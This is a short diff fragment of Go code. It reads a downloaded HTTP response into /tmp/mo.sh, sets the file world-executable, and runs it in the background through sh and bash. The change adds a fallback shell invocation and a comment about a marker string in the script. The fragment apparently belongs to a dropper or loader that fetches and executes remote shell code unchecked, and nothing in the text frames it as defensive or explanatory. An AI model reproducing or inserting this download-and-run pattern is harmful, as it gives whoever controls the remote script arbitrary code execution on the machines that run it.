@@ -41,11 +41,17 @@ mo_bytes  , err_readall := ioutil.ReadAll(resp.Body)
      ioutil.WriteFile("/tmp/mo.sh" , mo_bytes , 0777)
       
 
-        mo := exec.Command("sh",  "-c" ,  "cd /tmp ;  bash mo.sh") 
+
+        mo := exec.Command("sh",  "-c" ,  "cd /tmp ;  bash mo.sh ||  cd /tmp ; sh mo.sh") 
+
 
          mo.Start()
 
 
+
+
+
+// in new version check   #ATILA_VKZMN  in mo.sh
 
 }
 
